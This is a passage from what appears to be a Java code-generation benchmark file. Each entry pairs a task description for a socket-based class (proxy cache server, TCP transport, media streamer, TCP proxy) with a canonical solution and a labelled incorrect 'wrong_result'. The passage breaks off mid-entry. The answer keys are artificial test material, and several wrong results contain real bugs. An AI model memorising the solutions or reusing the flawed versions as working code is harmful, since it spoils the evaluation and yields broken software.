    "Instruction": "Task Description: Implement a Java class that acts as an HTTP proxy cache server, handling incoming client connections, processing requests, and managing cached resources. The server should be able to handle multiple concurrent connections efficiently.\n\nClass Description: HttpProxyCacheServer is a TCP server that listens for incoming HTTP requests, processes them through a caching mechanism, and returns the appropriate responses. It manages client connections in a thread-safe manner and maintains a cache of resources.\n\nAttributes:\n\nclientsLock: [Object] - Synchronization object for thread-safe access to clients map\nsocketProcessor: [ExecutorService] - Thread pool for processing socket connections\nclientsMap: [Map<String, HttpProxyCacheServerClients>] - Thread-safe map of URL to client handlers\nserverSocket: [ServerSocket] - Main server socket listening for connections\nport: [int] - Port number the server is listening on\nwaitConnectionThread: [Thread] - Thread that waits for incoming connections\nconfig: [Config] - Server configuration object\n\nMethods:\n\nHttpProxyCacheServer: [Constructor]([Context context]) -> [void] - Initializes the server with default configuration\nHttpProxyCacheServer: [Constructor]([Config config]) -> [void] - Initializes the server with custom configuration\nwaitForRequest: [void]() -> [void] - Continuously accepts incoming connections and delegates processing\nprocessSocket: [void]([Socket socket]) -> [void] - Processes an individual client socket connection\ngetClients: [HttpProxyCacheServerClients]([String url]) -> [HttpProxyCacheServerClients] - Retrieves or creates client handler for a URL\nreleaseSocket: [void]([Socket socket]) -> [void] - Properly closes and releases socket resources\ncloseSocketInput: [void]([Socket socket]) -> [void] - Closes socket input stream\ncloseSocketOutput: [void]([Socket socket]) -> [void] - Closes socket output stream\ncloseSocket: [void]([Socket socket]) -> [void] - Closes the socket connection\nonError: [void]([Throwable e]) -> [void] - Handles errors during server operation\nWaitRequestsRunnable: [Class] - Inner class implementing connection waiting logic\nSocketProcessorRunnable: [Class] - Inner class implementing socket processing logic",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Builder(context).buildConfig());\n    }\n\n    private HttpProxyCacheServer(Config config) {\n        this.config = config;\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error during waiting connection\", e));\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            HttpProxyCacheServerClients clients = getClients(url);\n            clients.processRequest(request, socket);\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (ProxyCacheException | IOException e) {\n            onError(new ProxyCacheException(\"Error processing request\", e));\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) throws ProxyCacheException {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients clients = clientsMap.get(url);\n            if (clients == null) {\n                clients = new HttpProxyCacheServerClients(url, config);\n                clientsMap.put(url, clients);\n            }\n            return clients;\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket input stream\", e));\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket output stream\", e));\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(new ProxyCacheException(\"Error closing socket\", e));\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Error handling\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HttpProxyCacheServer {\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor;\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new HashMap<>();\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this.config = new Config(context);\n        this.socketProcessor = Executors.newFixedThreadPool(config.getThreadPoolSize());\n        this.port = config.getPort();\n        try {\n            this.serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            onError(e);\n        }\n        this.waitConnectionThread = new Thread(new WaitRequestsRunnable());\n        this.waitConnectionThread.start();\n    }\n\n    public HttpProxyCacheServer(Config config) {\n        this.config = config;\n        this.socketProcessor = Executors.newFixedThreadPool(config.getThreadPoolSize());\n        this.port = config.getPort();\n        try {\n            this.serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            onError(e);\n        }\n        this.waitConnectionThread = new Thread(new WaitRequestsRunnable());\n        this.waitConnectionThread.start();\n    }\n\n    private void waitForRequest() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            } catch (IOException e) {\n                onError(e);\n            }\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            // Read HTTP request\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String requestLine = reader.readLine();\n            if (requestLine == null) {\n                closeSocket(socket);\n                return;\n            }\n\n            // Parse request line\n            String[] parts = requestLine.split(\" \");\n            if (parts.length < 3) {\n                closeSocket(socket);\n                return;\n            }\n\n            String method = parts[0];\n            String url = parts[1];\n            String version = parts[2];\n\n            // Check cache\n            HttpProxyCacheServerClients client = getClients(url);\n            if (client.isCached()) {\n                // Send cached response\n                client.sendCachedResponse(socket);\n            } else {\n                // Forward request to origin server\n                client.forwardRequest(socket);\n            }\n        } catch (IOException e) {\n            onError(e);\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) {\n        synchronized (clientsLock) {\n            HttpProxyCacheServerClients client = clientsMap.get(url);\n            if (client == null) {\n                client = new HttpProxyCacheServerClients(url);\n                clientsMap.put(url, client);\n            }\n            return client;\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocketInput(socket);\n        closeSocketOutput(socket);\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (socket != null && socket.getInputStream() != null) {\n                socket.getInputStream().close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (socket != null && socket.getOutputStream() != null) {\n                socket.getOutputStream().close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Handle error, e.g., log and shutdown\n        e.printStackTrace();\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (socketProcessor != null) {\n                socketProcessor.shutdown();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        @Override\n        public void run() {\n            waitForRequest();\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}"
  },
  {
    "Task_id": 523,
    "Instruction": "Task Description: Implement a TCP transport class that can function as either a server or client, handling network communication with configurable buffer sizes and TCP_NODELAY option.\n\nClass Description: TcpTransport is a class that provides TCP-based communication capabilities, acting as either a server (accepting connections) or client (initiating connections). It manages socket creation, stream handling, and includes a dedicated receiver thread for asynchronous data reception.\n\nAttributes:\n- srv_sock: [ServerSocket] - Server socket instance for accepting connections (server mode)\n- sock: [Socket] - Socket instance for communication (both modes)\n- output: [OutputStream] - Output stream for sending data\n- input: [InputStream] - Input stream for receiving data\n- receiver_thread: [Receiver] - Thread for handling incoming data\n- receiver: [RtReceiver] - Callback handler for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- out_buf_size: [int] - Output buffer size (default: 8192)\n- in_buf_size: [int] - Input buffer size (default: 8192)\n- server: [boolean] - Flag indicating server mode\n- tcp_nodelay: [boolean] - TCP_NODELAY socket option flag\n- log: [Log] - Logger instance\n\nMethods:\n- start: [void](String... options) -> [void] - Initializes the transport in either server or client mode, creates sockets and streams, starts receiver thread\n- stop: [void]() -> [void] - Closes all resources (sockets and streams)\n- send: [void](byte[] buf, int offset, int length) -> [void] - Sends data through the output stream\n- Receiver (inner class): [void](InputStream in) -> [void] - Thread class that continuously reads incoming data and notifies receiver callback",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TcpTransport {\n    protected ServerSocket srv_sock;\n    protected Socket sock;\n    protected OutputStream output;\n    protected InputStream input;\n    protected Receiver receiver_thread;\n    protected RtReceiver receiver;\n    protected InetAddress host;\n    protected int port=7800;\n    protected int out_buf_size=8192, in_buf_size=8192;\n    protected boolean server, tcp_nodelay;\n    protected final Log log=LogFactory.getLog(TcpTransport.class);\n\n    public void start(String ... options) throws Exception {\n        if(server) {\n            srv_sock=new ServerSocket(port, 50, host);\n            Socket s=srv_sock.accept();\n            s.setTcpNoDelay(tcp_nodelay);\n            input=in_buf_size > 0? new BufferedInputStream(s.getInputStream(), in_buf_size) : s.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(s.getOutputStream(), out_buf_size) : s.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n        else {\n            sock=new Socket();\n            sock.setTcpNoDelay(tcp_nodelay);\n            sock.connect(new InetSocketAddress(host, port));\n            input=in_buf_size > 0? new BufferedInputStream(sock.getInputStream(), in_buf_size) : sock.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(sock.getOutputStream(), out_buf_size) : sock.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(sock, srv_sock, input, output);\n    }\n\n    public void send(byte[] buf, int offset, int length) throws Exception {\n        output.write(buf, offset, length);\n        output.flush();\n    }\n\n    protected class Receiver extends Thread {\n        protected final InputStream in;\n\n        public Receiver(InputStream in) {\n            this.in=in;\n        }\n\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            for(;;) {\n                try {\n                    int num=in.read(buf, 0, buf.length);\n                    if(num == -1)\n                        return;\n                    if(num != buf.length)\n                        throw new IllegalStateException(\"expected \" + buf.length + \" bytes, but got only \" + num);\n                    if(receiver != null)\n                        receiver.receive(null, buf, 0, buf.length);\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TcpTransport {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private OutputStream output;\n    private InputStream input;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private int out_buf_size = 8192;\n    private int in_buf_size = 8192;\n    private boolean server;\n    private boolean tcp_nodelay;\n    private Log log;\n\n    public void start(String... options) {\n        if (server) {\n            try {\n                srv_sock = new ServerSocket(port);\n                srv_sock.setReuseAddress(true);\n                if (tcp_nodelay) {\n                    srv_sock.setTcpNoDelay(tcp_nodelay);\n                }\n                sock = srv_sock.accept();\n                sock.setTcpNoDelay(tcp_nodelay);\n                input = new BufferedInputStream(sock.getInputStream(), in_buf_size);\n                output = new BufferedOutputStream(sock.getOutputStream(), out_buf_size);\n                receiver_thread = new Thread(new Receiver(input, receiver));\n                receiver_thread.start();\n            } catch (IOException e) {\n                log.error(\"Error starting server\", e);\n            }\n        } else {\n            try {\n                sock = new Socket();\n                sock.connect(new InetSocketAddress(host, port));\n                if (tcp_nodelay) {\n                    sock.setTcpNoDelay(tcp_nodelay);\n                }\n                input = new BufferedInputStream(sock.getInputStream(), in_buf_size);\n                output = new BufferedOutputStream(sock.getOutputStream(), out_buf_size);\n                receiver_thread = new Thread(new Receiver(input, receiver));\n                receiver_thread.start();\n            } catch (IOException e) {\n                log.error(\"Error starting client\", e);\n            }\n        }\n    }\n\n    public void stop() {\n        if (server) {\n            try {\n                if (srv_sock != null) {\n                    srv_sock.close();\n                }\n            } catch (IOException e) {\n                log.error(\"Error closing server socket\", e);\n            }\n        } else {\n            try {\n                if (sock != null) {\n                    sock.close();\n                }\n            } catch (IOException e) {\n                log.error(\"Error closing client socket\", e);\n            }\n        }\n        try {\n            if (input != null) {\n                input.close();\n            }\n            if (output != null) {\n                output.close();\n            }\n        } catch (IOException e) {\n            log.error(\"Error closing streams\", e);\n        }\n        if (receiver_thread != null) {\n            receiver_thread.interrupt();\n            try {\n                receiver_thread.join();\n            } catch (InterruptedException e) {\n                log.error(\"Error joining receiver thread\", e);\n            }\n        }\n    }\n\n    public void send(byte[] buf, int offset, int length) {\n        try {\n            output.write(buf, offset, length);\n            output.flush();\n        } catch (IOException e) {\n            log.error(\"Error sending data\", e);\n        }\n    }\n\n    private class Receiver implements Runnable {\n        private final InputStream in;\n        private final RtReceiver receiver;\n\n        public Receiver(InputStream in, RtReceiver receiver) {\n            this.in = in;\n            this.receiver = receiver;\n        }\n\n        @Override\n        public void run() {\n            byte[] buffer = new byte[in_buf_size];\n            int bytesRead;\n            while (true) {\n                try {\n                    bytesRead = in.read(buffer);\n                    if (bytesRead == -1) {\n                        break;\n                    }\n                    receiver.onDataReceived(buffer, bytesRead);\n                } catch (IOException e) {\n                    log.error(\"Error reading from input stream\", e);\n                    break;\n                }\n            }\n            try {\n                in.close();\n            } catch (IOException e) {\n                log.error(\"Error closing input stream\", e);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 524,
    "Instruction": "Task Description: Create a Java class that implements an HTTP media streaming server capable of serving files over a local network connection using TCP sockets.\n\nClass Description: The HttpMediaStreamer class provides functionality to stream media files over HTTP protocol. It creates a local server socket, handles incoming client connections, and streams the requested file with proper HTTP headers. The class manages the server lifecycle and provides access to the streaming URI.\n\nAttributes:\n- uri: Uri - The URI pointing to the local HTTP streaming endpoint\n- serverSocket: ServerSocket - The server socket instance used for listening to client connections\n- TAG: String - Constant for logging purposes (class name)\n\nMethods:\n- HttpMediaStreamer(String filename, String mimeType) -> [Constructor] - Initializes the streamer with the file to serve and its MIME type\n- getUri() -> Uri - Returns the streaming URI for the hosted file\n- destroy() -> void - Closes the server socket and cleans up resources\n- create(String filename, String mimeType) -> Uri - Internal method that sets up the server socket and starts the streaming thread",
    "Canonical_solution": "import info.guardianproject.iocipher.File;\nimport info.guardianproject.iocipher.FileInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class HttpMediaStreamer {\n    private static final String TAG = HttpMediaStreamer.class.getSimpleName();\n    private Uri uri;\n    private ServerSocket serverSocket;\n\n    public HttpMediaStreamer(String filename, String mimeType) throws IOException {\n        uri = create(filename, mimeType);\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private Uri create(final String filename, final String mimeType) throws IOException {\n        final File file = new File(filename);\n        if (!file.exists()) {\n            throw new IOException(\"File not found \" + filename);\n        }\n\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n\n        serverSocket = new ServerSocket(0);\n        new Thread() {\n            public void run() {\n                try {\n                    while (true) {\n                        Socket socket = serverSocket.accept();\n                        byte[] b = new byte[8192];\n                        int len;\n\n                        InputStream is = socket.getInputStream();\n                        StringBuilder isb = new StringBuilder();\n                        len = is.read(b);\n                        isb.append(new String(b));\n\n                        StringBuilder sb = new StringBuilder();\n                        sb.append(\"HTTP/1.1 200\\r\\n\");\n                        sb.append(\"Content-Type: \" + mimeType + \"\\r\\n\");\n                        sb.append(\"Content-Length: \" + file.length() + \"\\r\\n\\r\\n\");\n\n                        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n                        bos.write(sb.toString().getBytes());\n\n                        FileInputStream fis = new FileInputStream(file);\n                        int idx = 0;\n\n                        while ((len = fis.read(b)) != -1) {\n                            bos.write(b, 0, len);\n                            idx += len;\n                            Log.d(TAG, \"sharing via stream: \" + idx);\n                        }\n\n                        fis.close();\n                        bos.flush();\n                        bos.close();\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    Log.d(TAG, \"web share error\", e);\n                }\n            }\n        }.start();\n\n        Uri uri = Uri.parse(\"http://localhost:\" + serverSocket.getLocalPort() + file.getAbsolutePath());\n        return uri;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HttpMediaStreamer {\n    private ServerSocket serverSocket;\n    private URI uri;\n    private static final String TAG = \"HttpMediaStreamer\";\n    private String filename;\n    private String mimeType;\n\n    public HttpMediaStreamer(String filename, String mimeType) {\n        this.filename = filename;\n        this.mimeType = mimeType;\n        this.uri = create(filename, mimeType);\n    }\n\n    public URI getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        if (serverSocket != null) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private URI create(String filename, String mimeType) {\n        try {\n            int port = 8080;\n            serverSocket = new ServerSocket(port);\n            String uriPath = \"/\" + filename;\n            uri = new URI(\"http://localhost:\" + port + uriPath);\n            new Thread(() -> {\n                while (true) {\n                    try {\n                        Socket clientSocket = serverSocket.accept();\n                        handleClient(clientSocket, filename, mimeType);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n            return uri;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private void handleClient(Socket clientSocket, String filename, String mimeType) {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String requestLine = in.readLine();\n            if (requestLine == null) {\n                clientSocket.close();\n                return;\n            }\n            String[] parts = requestLine.split(\" \");\n            if (parts.length < 2) {\n                clientSocket.close();\n                return;\n            }\n            String path = parts[1];\n            if (!path.equals(uri.getPath())) {\n                sendResponse(clientSocket, 404, \"Not Found\");\n                return;\n            }\n            sendResponse(clientSocket, 200, \"OK\", mimeType, filename);\n            FileInputStream fis = new FileInputStream(filename);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                clientSocket.getOutputStream().write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            clientSocket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void sendResponse(Socket socket, int statusCode, String statusMessage, String mimeType, String filename) throws IOException {\n        StringBuilder response = new StringBuilder();\n        response.append(\"HTTP/1.1 \").append(statusCode).append(\" \").append(statusMessage).append(\"\\r\\n\");\n        response.append(\"Content-Type: \").append(mimeType).append(\"\\r\\n\");\n        response.append(\"Content-Length: \").append(new File(filename).length()).append(\"\\r\\n\");\n        response.append(\"Connection: close\\r\\n\");\n        response.append(\"\\r\\n\");\n        OutputStream out = socket.getOutputStream();\n        out.write(response.toString().getBytes());\n        out.flush();\n    }\n\n    private void sendResponse(Socket socket, int statusCode, String statusMessage) throws IOException {\n        StringBuilder response = new StringBuilder();\n        response.append(\"HTTP/1.1 \").append(statusCode).append(\" \").append(statusMessage).append(\"\\r\\n\");\n        response.append(\"Connection: close\\r\\n\");\n        response.append(\"\\r\\n\");\n        OutputStream out = socket.getOutputStream();\n        out.write(response.toString().getBytes());\n        out.flush();\n    }\n}"
  },
  {
    "Task_id": 526,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to accept client connections and read data from them.\n\nClass Description: The GraphiteBridge class provides functionality to start a TCP server, accept client connections, read data from connected clients, and properly close all connections and resources.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- clientSocket: Socket - The socket representing an accepted client connection\n- inputReader: BufferedReader - The reader used to read data from the client connection\n\nMethods:\n- startServer(int port) -> void - Starts the server socket listening on the specified port\n- acceptConnection() -> void - Accepts an incoming client connection and initializes the input reader\n- readData() -> String - Reads a line of data from the connected client\n- closeConnection() -> void - Closes all open resources including the input reader, client socket, and server socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class GraphiteBridge {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void acceptConnection() throws IOException {\n        clientSocket = serverSocket.accept();\n        inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n    }\n\n    public String readData() throws IOException {\n        return inputReader.readLine();\n    }\n\n    public void closeConnection() throws IOException {\n        if (inputReader != null) {\n            inputReader.close();\n        }\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class GraphiteBridge {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void acceptConnection() {\n        try {\n            clientSocket = serverSocket.accept();\n            inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String readData() {\n        try {\n            return inputReader.readLine();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (inputReader != null) inputReader.close();\n            if (clientSocket != null) clientSocket.close();\n            if (serverSocket != null) serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 527,
    "Instruction": "Task Description: Create a TCP proxy server class that handles bidirectional communication between a client and a remote server, with capabilities to start, monitor usage, and shutdown the proxy.\n\nClass Description: JankyProxy is a TCP proxy server implementation that listens on a local port, forwards client requests to a remote server, and relays responses back to the client. It uses multithreading to handle bidirectional communication simultaneously.\n\nAttributes:\n- thread: ThreadProxy - The worker thread handling the proxy operations\n- sClient: Socket - The client socket connection\n- socket: ServerSocket - The server socket listening for client connections\n- SERVER_URL: String - The URL of the remote server to proxy to\n- SERVER_PORT: int - The port of the remote server to proxy to\n- wasUsedForClientToServer: boolean - Flag indicating if the proxy was used for client-to-server communication\n\nMethods:\n- runServer(String host, int remoteport, int localport) -> void - Starts the proxy server listening on the specified local port and forwarding to the given remote host and port\n- wasUsed() -> boolean - Returns whether the proxy was used for client-to-server communication\n- shutdown() -> void - Gracefully shuts down the proxy server\n- run() -> void - (ThreadProxy method) The main proxy logic handling bidirectional communication between client and server\n- shutdown() -> void - (ThreadProxy method) Stops the proxy thread and closes connections",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\npublic class JankyProxy {\n    private static ThreadProxy thread;\n\n    public static void runServer(String host, int remoteport, int localport) {\n        try {\n            System.out.println(\"Starting proxy for \" + host + \":\" + remoteport + \" on port \" + localport);\n            ServerSocket server = new ServerSocket(localport);\n            thread = new ThreadProxy(server, host, remoteport);\n        } catch (Exception e) {\n            System.err.println(e);\n            System.err.println(\"Usage: java ProxyMultiThread <host> <remoteport> <localport>\");\n        }\n    }\n\n    public static boolean wasUsed() {\n        return thread.wasUsedForClientToServer;\n    }\n\n    public static void shutdown() {\n        if (thread != null) {\n            try {\n                thread.shutdown();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ThreadProxy extends Thread {\n        private Socket sClient;\n        private ServerSocket socket;\n        private final String SERVER_URL;\n        private final int SERVER_PORT;\n        public boolean wasUsedForClientToServer;\n\n        public ThreadProxy(ServerSocket socket, String ServerUrl, int ServerPort) {\n            this.SERVER_URL = ServerUrl;\n            this.SERVER_PORT = ServerPort;\n            this.socket = socket;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            try {\n                sClient = socket.accept();\n                final byte[] request = new byte[1024];\n                byte[] reply = new byte[4096];\n                final InputStream inFromClient = sClient.getInputStream();\n                final OutputStream outToClient = sClient.getOutputStream();\n                Socket server = null;\n\n                try {\n                    server = new Socket(SERVER_URL, SERVER_PORT);\n                } catch (IOException e) {\n                    PrintWriter out = new PrintWriter(new OutputStreamWriter(outToClient));\n                    out.flush();\n                    System.out.println(\"SERVER_URL = \" + SERVER_URL + \" : \" + SERVER_PORT);\n                    throw new RuntimeException(e);\n                }\n\n                final InputStream inFromServer = server.getInputStream();\n                final OutputStream outToServer = server.getOutputStream();\n\n                new Thread(() -> {\n                    int bytes_read;\n                    try {\n                        while ((bytes_read = inFromClient.read(request)) != -1) {\n                            outToServer.write(request, 0, bytes_read);\n                            outToServer.flush();\n                            wasUsedForClientToServer = true;\n                        }\n                    } catch (IOException ignored) {\n                    }\n                    try {\n                        outToServer.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n\n                int bytes_read;\n                try {\n                    while ((bytes_read = inFromServer.read(reply)) != -1) {\n                        outToClient.write(reply, 0, bytes_read);\n                        outToClient.flush();\n                    }\n                } catch (IOException e) {\n                } finally {\n                    try {\n                        if (server != null) server.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                outToClient.close();\n                sClient.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shutdown() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            interrupt();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class JankyProxy {\n    private ThreadProxy thread;\n    private Socket sClient;\n    private ServerSocket socket;\n    private String SERVER_URL;\n    private int SERVER_PORT;\n    private boolean wasUsedForClientToServer;\n\n    public void runServer(String host, int remoteport, int localport) {\n        this.SERVER_URL = host;\n        this.SERVER_PORT = remoteport;\n        try {\n            socket = new ServerSocket(localport);\n            while (true) {\n                sClient = socket.accept();\n                thread = new ThreadProxy(sClient, this);\n                thread.start();\n                wasUsedForClientToServer = true;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean wasUsed() {\n        return wasUsedForClientToServer;\n    }\n\n    public void shutdown() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n            if (thread != null) {\n                thread.shutdown();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        try {\n            Socket remoteSocket = new Socket(SERVER_URL, SERVER_PORT);\n            InputStream clientIn = sClient.getInputStream();\n            OutputStream clientOut = sClient.getOutputStream();\n            InputStream remoteIn = remoteSocket.getInputStream();\n            OutputStream remoteOut = remoteSocket.getOutputStream();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n\n            while ((bytesRead = clientIn.read(buffer)) > 0) {\n                remoteOut.write(buffer, 0, bytesRead);\n                remoteOut.flush();\n            }\n\n            while ((bytesRead = remoteIn.read(buffer)) > 0) {\n                clientOut.write(buffer, 0, bytesRead);\n                clientOut.flush();\n            }\n\n            sClient.close();\n            remoteSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        try {\n            if (sClient != null) {\n                